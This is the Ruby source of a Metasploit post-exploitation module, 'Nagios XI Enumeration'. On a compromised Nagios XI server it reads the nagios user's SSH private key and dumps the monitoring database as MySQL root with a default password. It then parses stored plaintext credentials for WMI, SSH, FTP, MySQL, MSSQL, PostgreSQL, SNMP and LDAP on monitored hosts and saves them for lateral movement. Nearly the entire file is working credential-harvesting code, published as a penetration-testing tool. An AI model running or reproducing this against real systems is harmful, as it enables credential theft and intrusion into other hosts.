  ##
  # This module requires Metasploit: https://metasploit.com/download
  # Current source: https://github.com/rapid7/metasploit-framework
  ##

  class MetasploitModule < Msf::Post
    include Msf::Post::Linux::System
    include Msf::Exploit::FileDropper

    def initialize(info={})
      super(update_info(info, {
        'Name'           => 'Nagios XI Enumeration',
        'Description'    => %q{
          NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials, creating opportunities for lateral movement.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>         [
            'Cale Smith',   # @0xC413
          ],
        'DisclosureDate'  => 'Apr 17 2018',
        'Platform'       => 'linux',
        'SessionTypes'   => ['shell', 'meterpreter'],
        }
      ))
      register_options([
        OptString.new('DB_ROOT_PWD', [true, 'Password for DB root user, an option if they change this', 'nagiosxi' ])
      ])
    end

    # save found creds in the MSF DB for easy use
    def report_obj(cred, login)#, login)
      return if cred.nil? || login.nil?
      credential_data = {
        origin_type: :session,
        post_reference_name: self.fullname,
        session_id: session_db_id,
        workspace_id: myworkspace_id,

      }.merge(cred)
      credential_core = create_credential(credential_data)

      login_data = {
        core: credential_core,
        workspace_id: myworkspace_id
      }.merge(login)

      create_credential_login(login_data)
    end

    #parse out domain realm for windows services
    def parse_realm(username)
          userealm=username.split('/')

          if userealm.count>1
            realm = userealm[0]
            username = userealm[1]

            credential_data={
              realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
              realm_value: realm,
              username: username
            }
          else
            credential_data={
              username: username
            }

          end

      return credential_data
    end

    def run
      @peer = "#{session.session_host}:#{session.session_port}"

      @creds = []
      @ssh_keys = []

      #get nagios SSH private key
      print_status('Attempting to grab Nagios SSH key')
      ssh_key = read_file('/home/nagios/.ssh/id_rsa')

      if ssh_key.nil?
        print_status('No SSH key found')
      else
        print_good('SSH key found!')
        ssh_key_loot = store_loot(
          'nagios_ssh_priv_key',
          'text/plain',
          session,
          ssh_key,
          nil
        )
      print_status("Nagios SSH key stored in #{ssh_key_loot}")
      end



      print_status('Attempting to dump Nagios DB')

      db_dump_file  = "/tmp/#{Rex::Text.rand_text_alpha(6)}"

      sql_query  =  %Q|mysql -u root -p#{datastore['DB_ROOT_PWD']} -e "|
      sql_query <<  %Q|SELECT nagios_services.check_command_object_id, nagios_hosts.address, REPLACE(nagios_services.check_command_args,'\\"','%22') FROM nagios.nagios_hosts |
      sql_query <<  %Q|INNER JOIN nagios.nagios_services on nagios_hosts.host_object_id=nagios_services.host_object_id |
      sql_query <<  %Q|INNER JOIN nagios.nagios_commands on nagios_commands.object_id = nagios_services.check_command_object_id |
      sql_query <<  %Q|WHERE nagios_services.check_command_object_id!=89 |
      sql_query <<  %Q|ORDER BY nagios_services.check_command_object_id |
      sql_query <<  %Q|INTO OUTFILE '#{db_dump_file}' FIELDS TERMINATED BY ',' ENCLOSED BY '\\"' LINES TERMINATED BY '\\n' ;"|

      cmd_exec(sql_query)
      db_dump = read_file(db_dump_file)

      if db_dump.nil?
        fail_with(Failure::Unknown, 'Could not get DB contents')
      else
        print_good('Nagios DB dump successful')
        #store raw db results, there is likely good stuff in here that we don't parse out
        db_loot = store_loot(
          'nagiosxi_raw_db_dump',
          'text/plain',
          session,
          db_dump,
          nil
        )
      print_status("Raw Nagios DB dump #{db_loot}")
      print_status("Look through the DB dump manually. There could be\ some good loot we didn't parse out.")
      end

      CSV.parse(db_dump) do |row|
      case row[0]
      when "110" #WMI
        host = row[1]
        creds = row[2].split('!')
        username = creds[0].match(/'(.*?)'/)[1]
        password = creds[1].match(/'(.*?)'/)[1]

        user_credential_data = parse_realm(username)

        credential_data = {
          private_data: password,
          private_type: :password,
        }.merge(user_credential_data)

        login_data = {
          address: host,
          port: 135,
          service_name: 'WMI',
          protocol: 'tcp',
        }

      when "59" #SSH
          host = row[1]

          credential_data = {
            username: 'nagios',
            private_data: ssh_key,
            private_type: :ssh_key
          }

          login_data = {
            address: host,
            port: 22,
            service_name: 'SSH',
            protocol: 'tcp',
          }

      when "25" #FTP
          host = row[1]
          creds = row[2].split('!')
          username = creds[0]
          password = creds[1]

          credential_data = {
            username: username,
            private_data: password,
            private_type: :password,
          }

          login_data = {
            address: host,
            port: 21,
            service_name: 'FTP',
            protocol: 'tcp',
          }

      when "67" #MYSQL
          host = row[1]
          username=row[2].match(/--username=(.*?)\s/)[1]
          password=row[2].match(/--password=%22(.*?)%22/)[1]

          credential_data = {
            username: username,
            private_data: password,
            private_type: :password,
          }

          login_data = {
            address: host,
            port: 3306,
            service_name: 'MySQL',
            protocol: 'tcp',
          }

      when "66" #MSSQL
          host = row[1]
          username=row[2].match(/-U '(.*?)'/)[1]
          password=row[2].match(/-P '(.*?)'/)[1]

          user_credential_data = parse_realm(username)
          credential_data = {
            private_data: password,
            private_type: :password,
          }.merge(user_credential_data)

          login_data = {
            address: host,
            port: 1433,
            service_name: 'MSSQL',
            protocol: 'tcp',
          }

      when "76" #POSTGRES
          host = row[1]
          username=row[2].match(/--dbuser=(.*?)\s/)[1]
          password=row[2].match(/--dbpass=%22(.*?)%22/)[1]

          credential_data = {
            username: username,
            private_data: password,
            private_type: :password,
          }

          login_data = {
            address: host,
            port: 5432,
            service_name: 'PostgreSQL',
            protocol: 'tcp',
          }

      when "85" #SNMP
          host = row[1]
          creds = row[2].split('!')
          password = ' '
          username = creds[0]
          port = 161

          credential_data = {
            username: username,
            private_data: password,
            private_type: :password,
          }

          login_data = {
            address: host,
            port: 161,
            service_name: 'SNMP',
            protocol: 'udp',
          }

      when "88" #LDAP
          host = row[1]
          username = row[2].match(/-D %22(.*?)%22/)[1]
          password = row[2].match(/-P %22(.*?)%22/)[1]

          credential_data = {
            username: username,
            private_data: password,
            private_type: :password,
          }

          login_data = {
            address: host,
            port: 389,
            service_name: 'LDAP',
            protocol: 'tcp',
          }
      else
          #base case
      end
      unless credential_data.nil? || login_data.nil?
        report_obj(credential_data, login_data)
      end
    end


    print_status("Run 'creds' to see credentials loaded into the MSF DB")

    #cleanup db dump
    register_file_for_cleanup(db_dump_file)
    end
  end

